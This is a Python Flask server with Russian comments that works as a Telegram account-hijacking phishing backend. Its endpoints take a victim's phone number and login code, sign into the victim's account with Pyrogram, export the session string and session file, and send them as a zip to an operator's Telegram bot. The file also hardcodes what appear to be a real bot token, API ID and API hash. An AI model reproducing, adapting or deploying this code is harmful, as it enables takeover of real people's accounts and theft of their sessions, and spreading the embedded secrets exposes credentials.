from flask import Flask, request, jsonify, send_from_directory
import os
import re
import requests
import zipfile
import asyncio
from threading import Thread

app = Flask(__name__)

# ===== НАСТРОЙКИ (ЗАМЕНИ НА СВОИ) =====
BOT_TOKEN = "7972485896:AAGDUO9cKu4qMdoa7dC87-Ybq1kUoPZNF_A"
OWNER_ID = 742347183
API_ID = 39945573
API_HASH = "4addef563b163d9d1977fdfb4abf50db"

PROXY_ENABLED = False
PROXY_HOST = "bproxy.site"
PROXY_PORT = 1080
PROXY_USERNAME = ""
PROXY_PASSWORD = ""

proxy_dict = None
if PROXY_ENABLED:
    proxy_dict = {
        "scheme": "socks5",
        "hostname": PROXY_HOST,
        "port": PROXY_PORT,
        "username": PROXY_USERNAME,
        "password": PROXY_PASSWORD
    }

# Хранилище для сессий
temp_sessions = {}

def send_telegram(text):
    try:
        requests.post(
            f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
            json={"chat_id": OWNER_ID, "text": text[:4000]},
            timeout=10
        )
    except:
        pass

def send_file(file_path, caption):
    try:
        with open(file_path, 'rb') as f:
            requests.post(
                f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument",
                data={"chat_id": OWNER_ID, "caption": caption},
                files={"document": f},
                timeout=30
            )
    except:
        pass

# ===== АСИНХРОННЫЕ ФУНКЦИИ =====
async def send_code_async(phone_full):
    from pyrogram import Client
    
    try:
        client = Client(f"temp_{phone_full.replace('+', '')}", api_id=API_ID, api_hash=API_HASH, proxy=proxy_dict)
        await client.connect()
        result = await client.send_code(phone_full)
        temp_sessions[phone_full] = {
            'client': client,
            'phone_code_hash': result.phone_code_hash
        }
        send_telegram(f"✅ Код отправлен на {phone_full}")
        return True
    except Exception as e:
        send_telegram(f"❌ Ошибка отправки кода: {str(e)[:200]}")
        return False

async def login_async(phone_full, code):
    from pyrogram import Client
    import zipfile
    
    if phone_full not in temp_sessions:
        send_telegram(f"❌ Нет сессии для {phone_full}")
        return False
    
    session_data = temp_sessions[phone_full]
    client = session_data['client']
    phone_code_hash = session_data['phone_code_hash']
    
    try:
        await client.sign_in(phone_full, code, phone_code_hash=phone_code_hash)
        
        session_string = await client.export_session_string()
        phone_clean = phone_full.replace('+', '')
        session_file = f"{phone_clean}.session"
        client.session.set_db(session_file)
        await client.disconnect()
        
        zip_name = f"{phone_clean}.zip"
        with zipfile.ZipFile(zip_name, 'w') as zf:
            zf.write(session_file, arcname=os.path.basename(session_file))
        
        send_file(zip_name, f"✅ Аккаунт: {phone_full}\n\n{session_string}")
        
        os.remove(session_file)
        os.remove(zip_name)
        del temp_sessions[phone_full]
        
        return True
    except Exception as e:
        send_telegram(f"❌ Ошибка входа: {str(e)[:200]}")
        return False

# ===== ЗАПУСК АСИНХРОННЫХ ЗАДАЧ В ПОТОКЕ =====
def run_async_send_code(phone_full):
    asyncio.run(send_code_async(phone_full))

def run_async_login(phone_full, code):
    asyncio.run(login_async(phone_full, code))

# ===== API ЭНДПОЙНТЫ =====
@app.route('/')
def index():
    if os.path.exists('index.html'):
        return send_from_directory('.', 'index.html')
    return "Сайт работает", 200

@app.route('/api/send_code', methods=['POST'])
def send_code():
    data = request.json
    phone = data.get('phone', '')
    
    phone_clean = re.sub(r'\D', '', phone)
    if not phone_clean.startswith('7'):
        phone_clean = '7' + phone_clean
    phone_full = '+' + phone_clean
    
    send_telegram(f"📱 Запрос кода для {phone_full}")
    
    # Запускаем в отдельном потоке
    thread = Thread(target=run_async_send_code, args=(phone_full,))
    thread.start()
    
    return jsonify({"status": "ok", "message": "Код отправляется"})

@app.route('/api/verify_code', methods=['POST'])
def verify_code():
    data = request.json
    phone = data.get('phone', '')
    code = data.get('code', '')
    
    phone_clean = re.sub(r'\D', '', phone)
    if not phone_clean.startswith('7'):
        phone_clean = '7' + phone_clean
    phone_full = '+' + phone_clean
    
    send_telegram(f"🔑 Получен код для {phone_full}: {code}")
    
    # Запускаем вход в отдельном потоке
    thread = Thread(target=run_async_login, args=(phone_full, code))
    thread.start()
    
    return jsonify({"success": True})

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port)
